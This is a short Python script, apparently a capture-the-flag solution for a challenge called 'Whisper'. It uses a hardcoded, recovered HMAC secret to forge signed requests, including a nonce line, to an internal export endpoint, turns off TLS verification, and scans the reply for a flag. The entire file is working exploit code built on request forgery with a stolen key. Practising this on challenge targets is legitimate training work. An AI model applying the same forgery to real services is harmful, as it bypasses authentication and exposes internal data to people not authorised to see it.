#!/usr/bin/env python3
"""Whisper finish — secret recovered; add X-Nonce as a final LF line to string-to-sign."""
import time, hmac, hashlib, re, uuid, requests, urllib3
urllib3.disable_warnings()
B="https://whisper-3cfe1275e06a.chall.hiddeninvestigations.net"; PATH="/internal/export"
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
SECRET="eda9caae1dbb08b5562fc7b252e2bb88"
FLAG=re.compile(r'[A-Za-z0-9_]{2,20}\{[^}]{2,160}\}')

def do_export(body=b"", query="", extra_lines=None, headers_extra=None):
    ts=str(int(time.time())); nonce=uuid.uuid4().hex
    lines=["POST",PATH,query,hashlib.sha256(body).hexdigest(),ts]
    if extra_lines is not None:
        lines += extra_lines
    sts="\n".join(lines)
    sig=hmac.new(SECRET.encode(), sts.encode(), hashlib.sha256).hexdigest()
    h={"X-Client-Id":"report-signer","X-Timestamp":ts,"X-Signature":sig,"X-Nonce":nonce}
    if headers_extra: h.update(headers_extra)
    url=B+PATH+(("?"+query) if query else "")
    r=s.post(url, headers=h, data=body, timeout=15)
    return r.status_code, r.text, nonce

# append the nonce as the final LF-separated line
ts=str(int(time.time())); nonce=uuid.uuid4().hex
sts="\n".join(["POST",PATH,"",hashlib.sha256(b"").hexdigest(),ts,nonce])
sig=hmac.new(SECRET.encode(), sts.encode(), hashlib.sha256).hexdigest()
r=s.post(B+PATH, headers={"X-Client-Id":"report-signer","X-Timestamp":ts,
         "X-Signature":sig,"X-Nonce":nonce}, timeout=15)
print(f"[with nonce line] -> [{r.status_code}]\n{r.text[:1000]}")
for m in FLAG.finditer(r.text): print("*** FLAG:", m.group())
